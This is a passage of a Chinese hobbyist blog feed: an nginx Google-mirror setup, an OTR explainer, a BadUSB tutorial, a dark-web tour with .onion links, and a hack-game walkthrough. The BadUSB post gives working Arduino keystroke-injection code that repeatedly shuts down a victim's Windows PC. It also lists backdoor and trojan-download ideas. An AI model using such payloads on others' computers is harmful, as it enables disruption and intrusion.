class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 编译, 安装</span></div><div class="line"><span class="comment"># 如果扩展有报错, 请发 issue 到</span></div><div class="line"><span class="comment"># https://github.com/cuber/ngx_http_google_filter_module/issues</span></div><div class="line"><span class="comment">#</span></div><div class="line">make</div><div class="line">sudo make install</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 启动, 安装过程到此结束</span></div><div class="line"><span class="comment">#</span></div><div class="line">sudo /opt/nginx-1.7.8/sbin/nginx</div><div class="line"></div><div class="line">vi /opt/nginx-1.7.8/conf/nginx.conf</div></pre></td></tr></table></figure>
<p>http配置方式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  server_name &lt;你的域名&gt;;</div><div class="line">  listen <span class="number">80</span>;</div><div class="line"></div><div class="line">  resolver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>;</div><div class="line">  location / &#123;</div><div class="line">    google on;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>https配置方式<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  server_name &lt;你的域名&gt;;</div><div class="line">  listen <span class="number">443</span>;</div><div class="line"></div><div class="line">  ssl on;</div><div class="line">  ssl_certificate &lt;你的证书&gt;;</div><div class="line">  ssl_certificate_key &lt;你的私钥&gt;;</div><div class="line"></div><div class="line">  resolver <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>;</div><div class="line">  location / &#123;</div><div class="line">    google on;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>随后<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># 配置修改后, 需要 reload nginx 来让配置生效, </span></div><div class="line"><span class="comment">#</span></div><div class="line">sudo /opt/nginx-1.7.8/sbin/nginx <span class="_">-s</span> reload</div></pre></td></tr></table></figure></p>
<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>测试一下网站，是可以访问的，出于一些原因，我个人搭建的镜像站不予公开。</p>
<h1 id="参考技术"><a href="#参考技术" class="headerlink" title="参考技术"></a>参考技术</h1><p><a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="external">https://github.com/cuber/ngx_http_google_filter_module</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前两天，Google开发者大会高调的宣布Google Developers 网站终于正式上线了，希望Google能够解决一切问题，早日回归大陆市场。&lt;/p&gt;
    
    </summary>
    
      <category term="Ops" scheme="http://blog.yfgeek.com/categories/Ops/"/>
    
    
      <category term="Ops" scheme="http://blog.yfgeek.com/tags/Ops/"/>
    
  </entry>
  
  <entry>
    <title>OTR(Off-the-Record) 技术探讨</title>
    <link href="http://blog.yfgeek.com/2016/12/06/OTR%E6%8A%80%E6%9C%AF%E6%8E%A2%E8%AE%A8/"/>
    <id>http://blog.yfgeek.com/2016/12/06/OTR技术探讨/</id>
    <published>2016-12-06T20:25:59.000Z</published>
    <updated>2016-12-19T23:54:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。</p>
<a id="more"></a>
<p>通过OTR技术，能够实现:</p>
<ul>
<li>加密聊天内容</li>
<li>证明与你聊天的人就是与你聊天的人（防止中间人攻击）</li>
<li>服务器无法记录你的真实聊天内容</li>
</ul>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="消息鉴别码-MAC"><a href="#消息鉴别码-MAC" class="headerlink" title="消息鉴别码(MAC)"></a>消息鉴别码(MAC)</h2><p>在密码学中，消息鉴别码(Message Authentication Code)是经过特定算法后产生的一小段信息，检查某段消息的完整性，以及作身份验证。</p>
<p><img src="/content/images/otr/1.png" alt=""></p>
<p>假设有两个聊天用户，一个叫Alice，一个叫Bob。</p>
<p><img src="/content/images/otr/2.jpg" alt=""></p>
<p>例如：Alice要给一个叫Bob发信，Alice将明文MK使用Hash算法进行摘要提取，提取结果为Hash(MK)，之后用Alice的私钥对摘要进行签名SA[Hash(MK)]，之后将MK和SA[Hash(MK)]一同发给Bob。</p>
<p>其中SA[Hash(MK)]便可称之为消息鉴别码（MAC）。</p>
<p>它可以用来检查在消息传递过程中，其内容是否被更改过，不管更改的原因是来自意外或是蓄意攻击。同时可以作为消息来源的身份验证，确认消息的来源。</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>第一步，使用Diffie-Hellman双方交换公钥，确认公钥可以信任（只大概叙述，取mod运算被简化）。</p>
<ul>
<li>Alice（用A表示）和Bob（用B表示）每人分别取一个数x,y,并且取一个g</li>
<li>A-&gt;B: Alice 生成g^x，并且签名SignAlice(g^x)</li>
<li>B-&gt;A: Bob 生成g^y，并且签名SignBob(g^y)</li>
<li>SS=g^xy: 生成共享的公钥</li>
</ul>
<p>第二步，使用公钥加密消息，消息传递。</p>
<ul>
<li>计算EK=Hash(SS), MK=Hash(EK) </li>
<li>A-&gt;B: Encek(M), MAC(Encek(M),MK)</li>
<li>Enc采用对称加密算法，比如AES算法用EK作为密钥</li>
<li>Bob 用MK验证MAC, 用EK解密M</li>
<li>保密性和真实性得到了保证</li>
</ul>
<p>第三步，更新密钥</p>
<ul>
<li>Alice and Bob 再取一个x’,y’</li>
<li>A-&gt;B: g^x’, MAC(g^x’, MK)</li>
<li>B-&gt;A: g^y’, MAC(g^y’, MK)</li>
<li>SS’ = H(g^x’y’)</li>
<li>EK’ = H(SS’), MK’=H(EK’)</li>
<li>随后，Alice和Bob安全清除掉之前的SS, x, y, EK</li>
</ul>
<p>第四步，继续保留 MK</p>
<ul>
<li>Alice 和 Bob 并不需要去清除MK</li>
<li>事实上，在他们发下一条消息的时候还用着之前的MK</li>
<li>这让中间人攻击者只能伪造过去的消息，并不能对现在的消息造成影响</li>
</ul>
<p>从宏观的角度上来看，假设是Alice是消息发送方 发给 Bob是消息接受方，大致步骤可以分为：</p>
<ol>
<li>Alice 和 Bob 都自行生成一对公私钥对，并将自己的公钥发送给对方</li>
<li>若消息Alice打算发送消息M，则发送方首先用Bob的公钥和自己的私钥对M进行加密、签名，得到M1</li>
<li>M1经由服务器被发送给消息接收方</li>
<li>Bob用自己的私钥和Alice的公钥对M1进行解密、签名校验，最终还原出M</li>
</ol>
<h1 id="Awesome-OTRs"><a href="#Awesome-OTRs" class="headerlink" title="Awesome OTRs"></a>Awesome OTRs</h1><p>官网: <a href="https://otr.cypherpunks.ca/" target="_blank" rel="external">https://otr.cypherpunks.ca/</a></p>
<p>pidgin-otr: <a href="https://otr.cypherpunks.ca/gentoo-install/otr-setup.html" target="_blank" rel="external">https://otr.cypherpunks.ca/gentoo-install/otr-setup.html</a></p>
<p>JavaScript 实现: <a href="https://github.com/arlolra/otr" target="_blank" rel="external">https://github.com/arlolra/otr</a></p>
<p>otr.to源代码(JS): <a href="https://github.com/OTRMan/otr.to-chat" target="_blank" rel="external">https://github.com/OTRMan/otr.to-chat</a></p>
<p>一个python的otr项目: <a href="https://github.com/SpiralP/HexChat-otr" target="_blank" rel="external">https://github.com/SpiralP/HexChat-otr</a></p>
<p>otrtalk(JS): <a href="https://github.com/mnaamani/otrtalk" target="_blank" rel="external">https://github.com/mnaamani/otrtalk</a></p>
<p>Facebook的OTR实现Chrome插件:<a href="https://github.com/osnr/otron" target="_blank" rel="external">https://github.com/osnr/otron</a></p>
<p>一个基于OTR技术的P2P聊天系统: <a href="https://github.com/mehrvarz/P2pChatOTR" target="_blank" rel="external">https://github.com/mehrvarz/P2pChatOTR</a></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>研究算法的过程很有趣，也很累，每次应用OTR技术聊天的时候，我都强烈的感受到我的数据包被加密解密的过程，不知道为什么，感觉，异常，舒爽…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>Arduino Leonardo 打造 Bad USB</title>
    <link href="http://blog.yfgeek.com/2016/11/27/badusb/"/>
    <id>http://blog.yfgeek.com/2016/11/27/badusb/</id>
    <published>2016-11-27T02:48:23.000Z</published>
    <updated>2016-12-19T23:54:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>嘿嘿嘿，又是一篇猥琐小文。</p>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>什么是Bad USB？</p>
<p><img src="/content/images/badusb/0.jpg" alt=""></p>
<p>BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。</p>
<p>简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。</p>
<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。</p>
<p><img src="/content/images/badusb/1.jpg" alt=""></p>
<h1 id="原料"><a href="#原料" class="headerlink" title="原料"></a>原料</h1><ol>
<li>Arduino Leonardo</li>
<li>普通安卓USB线</li>
</ol>
<h1 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h1><p>比如我们要实现一个插入优盘就让对方电脑关机的功能：</p>
<p>用Arduino开发者工具，选择</p>
<p><img src="/content/images/badusb/2.jpg" alt=""></p>
<p>Arduino Leonardo</p>
<p>然后把程序烧录进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></div><div class="line">   Keyboard.begin();<span class="comment">//开始键盘通讯 </span></div><div class="line">  delay(<span class="number">5000</span>);<span class="comment">//延时</span></div><div class="line">  Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(<span class="string">'r'</span>);<span class="comment">//r键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.release(KEY_LEFT_GUI);</div><div class="line">  Keyboard.release(<span class="string">'r'</span>);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.println(<span class="string">"CMD"</span>);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  delay(<span class="number">3000</span>); </div><div class="line">  Keyboard.println(<span class="string">"shutdown -s -t 10"</span>);</div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.end();<span class="comment">//结束键盘通讯 </span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></div><div class="line">&#123;</div><div class="line">   Keyboard.begin();<span class="comment">//开始键盘通讯 </span></div><div class="line">  delay(<span class="number">5000</span>);<span class="comment">//延时</span></div><div class="line">  Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(<span class="string">'r'</span>);<span class="comment">//r键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.release(KEY_LEFT_GUI);</div><div class="line">  Keyboard.release(<span class="string">'r'</span>);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.println(<span class="string">"CMD"</span>);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  delay(<span class="number">3000</span>); </div><div class="line">  Keyboard.println(<span class="string">"shutdown -s -t 10"</span>);</div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.end();<span class="comment">//结束键盘通讯 </span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>已经在多台Windows电脑上试验成功。</p>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/content/images/badusb/preview.gif" alt=""></p>
<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><p>当然，你可以实现很多功能</p>
<ul>
<li>删除系统关键注册表使之蓝屏</li>
<li>留后门</li>
<li>新建用户</li>
<li>用户提权</li>
<li>调用Powershell下载木马</li>
<li>调用Powershell下载木马及从内存中提取出当前用户的Windows密码</li>
<li>rm -rf *</li>
</ul>
<p>此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。</p>
<p><a href="https://github.com/Xyntax/BadUSB-code" target="_blank" rel="external">https://github.com/Xyntax/BadUSB-code</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices" target="_blank" rel="external">http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices</a><br><a href="http://www.freebuf.com/sectool/107242.html" target="_blank" rel="external">http://www.freebuf.com/sectool/107242.html</a><br><a href="http://www.freebuf.com/articles/terminal/53886.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/53886.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;嘿嘿嘿，又是一篇猥琐小文。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>TOR暗网的秘密</title>
    <link href="http://blog.yfgeek.com/2016/11/26/TOR%E6%9A%97%E7%BD%91%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <id>http://blog.yfgeek.com/2016/11/26/TOR暗网的秘密/</id>
    <published>2016-11-26T01:00:34.000Z</published>
    <updated>2016-12-19T23:54:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。</p>
<p>以下内容纯属虚构。</p>
<a id="more"></a>
<h1 id="另一个互联网世界"><a href="#另一个互联网世界" class="headerlink" title="另一个互联网世界"></a>另一个互联网世界</h1><p>Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。</p>
<p>Tor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。</p>
<p>下面 我们来逛一逛都有什么 奇葩的 py交易。</p>
<h3 id="虚拟主机交易"><a href="#虚拟主机交易" class="headerlink" title="虚拟主机交易"></a>虚拟主机交易</h3><p><img src="/content/images/torworld/1.png" alt=""></p>
<h3 id="免费盗版市场"><a href="#免费盗版市场" class="headerlink" title="免费盗版市场"></a>免费盗版市场</h3><p>盗版书</p>
<p><img src="/content/images/torworld/2.png" alt=""></p>
<p>盗版音乐</p>
<p><img src="/content/images/torworld/13.png" alt=""></p>
<h3 id="英国枪支弹药交易"><a href="#英国枪支弹药交易" class="headerlink" title="英国枪支弹药交易"></a>英国枪支弹药交易</h3><p><img src="/content/images/torworld/3.png" alt=""></p>
<p>比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。</p>
<p>（英国持枪是合法的，但是我不感兴趣）</p>
<h3 id="暗网iPhone交易"><a href="#暗网iPhone交易" class="headerlink" title="暗网iPhone交易"></a>暗网iPhone交易</h3><p>不知道iPhone的货源，很便宜。</p>
<p><img src="/content/images/torworld/4.png" alt=""></p>
<h3 id="办证类"><a href="#办证类" class="headerlink" title="办证类"></a>办证类</h3><p>美国护照</p>
<p><img src="/content/images/torworld/5.png" alt=""></p>
<p>美国假身份证</p>
<p><img src="/content/images/torworld/7.png" alt=""></p>
<p>英国护照</p>
<p><img src="/content/images/torworld/6.png" alt=""></p>
<p>我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。</p>
<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p><img src="/content/images/torworld/8.png" alt=""></p>
<p>此外还有很多，没什么意思</p>
<h3 id="电子邮箱"><a href="#电子邮箱" class="headerlink" title="电子邮箱"></a>电子邮箱</h3><p><img src="/content/images/torworld/9.png" alt=""></p>
<p>几乎是全匿名的电子邮箱，用比特message登录的</p>
<h3 id="政治"><a href="#政治" class="headerlink" title="政治"></a>政治</h3><p>各种资本主义反动派论坛</p>
<p><img src="/content/images/torworld/10.png" alt=""></p>
<p><img src="/content/images/torworld/11.png" alt=""></p>
<h3 id="雇佣黑阔"><a href="#雇佣黑阔" class="headerlink" title="雇佣黑阔"></a>雇佣黑阔</h3><p><img src="/content/images/torworld/12.png" alt=""></p>
<p>日一个网站500欧元，还是挺赚的。</p>
<h3 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h3><p>当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。</p>
<h2 id="导航站"><a href="#导航站" class="headerlink" title="导航站"></a>导航站</h2><p><a href="http://dirnxxdraygbifgc.onion/" target="_blank" rel="external">http://dirnxxdraygbifgc.onion/</a></p>
<p><a href="http://torlinkbgs6aabns.onion/" target="_blank" rel="external">http://torlinkbgs6aabns.onion/</a></p>
<p><a href="http://32rfckwuorlf4dlv.onion/" target="_blank" rel="external">http://32rfckwuorlf4dlv.onion/</a></p>
<p><a href="http://torwikignoueupfm.onion/" target="_blank" rel="external">http://torwikignoueupfm.onion/</a></p>
<p><a href="http://torlinkbgs6aabns.onion/" target="_blank" rel="external">http://torlinkbgs6aabns.onion/</a></p>
<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><p><a href="http://xmh57jrzrnw6insl.onion/" target="_blank" rel="external">http://xmh57jrzrnw6insl.onion/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。&lt;/p&gt;
&lt;p&gt;以下内容纯属虚构。&lt;/p&gt;
    
    </summary>
    
      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
    
    
      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
    
  </entry>
  
  <entry>
    <title>再玩Monyer的Hack Game</title>
    <link href="http://blog.yfgeek.com/2016/11/23/%E5%86%8D%E7%8E%A9Monyer%E7%9A%84Hack-Game/"/>
    <id>http://blog.yfgeek.com/2016/11/23/再玩Monyer的Hack-Game/</id>
    <published>2016-11-23T19:15:20.000Z</published>
    <updated>2016-12-19T23:55:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。</p>
<a id="more"></a>
<h1 id="第零关"><a href="#第零关" class="headerlink" title="第零关"></a>第零关</h1><p><a href="http://monyer.com/game/game1/" target="_blank" rel="external">http://monyer.com/game/game1/</a></p>
<blockquote>
<p>请点击链接进入第1关： 连接在左边→ ←连接在右边</p>
</blockquote>
<p>可是我们看不到链接地址，直接打开审查工具。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>连接在左边→<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"first.php"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>←连接在右边<span class="tag">&lt;/<span class="name">span</span>&gt;</span></div></pre></td></tr></table></figure>
<p>好的输入地址，我么进入第一关</p>
<h1 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h1><p><a href="http://monyer.com/game/game1/first.php" target="_blank" rel="external">http://monyer.com/game/game1/first.php</a></p>
<p>打开页面依然是什么都没有，这很正常。审查工具看代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'txt'</span>).value==<span class="string">"  "</span>)&#123;</div><div class="line">            <span class="built_in">window</span>.location.href=<span class="string">"hello.php"</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            alert(<span class="string">"密码错误"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>好了 我们知道密码了，并且知道下一关的文件是hello.php</p>
<h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><p><a href="http://monyer.com/game/game1/hello.php" target="_blank" rel="external">http://monyer.com/game/game1/hello.php</a></p>
<p>审查工具看源代码，head中</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="built_in">document</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> a,b,c,d,e,f,g;</div><div class="line">    a = <span class="number">3.14</span>;</div><div class="line">    b = a * <span class="number">2</span>;</div><div class="line">    c = a + b;</div><div class="line">    d = c / b + a;</div><div class="line">    e = c - d * b + a;</div><div class="line">    f = e + d /c -b * a;</div><div class="line">    g = f * e - d + c * b + a;</div><div class="line">    a = g * g;</div><div class="line">    a = <span class="built_in">Math</span>.floor(a);</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">"txt"</span>).value==a)&#123;</div><div class="line">            <span class="built_in">window</span>.location.href=a + <span class="string">".php"</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            alert(<span class="string">"密码错误"</span>);</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a,b,c,d,e,f,g;</div><div class="line">    a = <span class="number">3.14</span>;</div><div class="line">    b = a * <span class="number">2</span>;</div><div class="line">    c = a + b;</div><div class="line">    d = c / b + a;</div><div class="line">    e = c - d * b + a;</div><div class="line">    f = e + d /c -b * a;</div><div class="line">    g = f * e - d + c * b + a;</div><div class="line">    a = g * g;</div><div class="line">    a = <span class="built_in">Math</span>.floor(a);</div><div class="line">    </div><div class="line"><span class="number">424178</span></div></pre></td></tr></table></figure></p>
<p>好的我们知道a的值是424178，输入，进入下一关</p>
<h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><p><a href="http://monyer.com/game/game1/424178.php" target="_blank" rel="external">http://monyer.com/game/game1/424178.php</a></p>
<p>head中存在js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/rocketscript"</span> data-rocketoptimized=<span class="string">"true"</span>&gt;</div><div class="line">    <span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">99</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">107</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">123</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">97</span>,<span class="number">32</span>,<span class="number">61</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">103</span>,<span class="number">39</span>,<span class="number">59</span>,<span class="number">13</span>,<span class="number">10</span>,<span class="number">09</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">40</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">69</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">66</span>,<span class="number">121</span>,<span class="number">73</span>,<span class="number">100</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">46</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">117</span>,<span 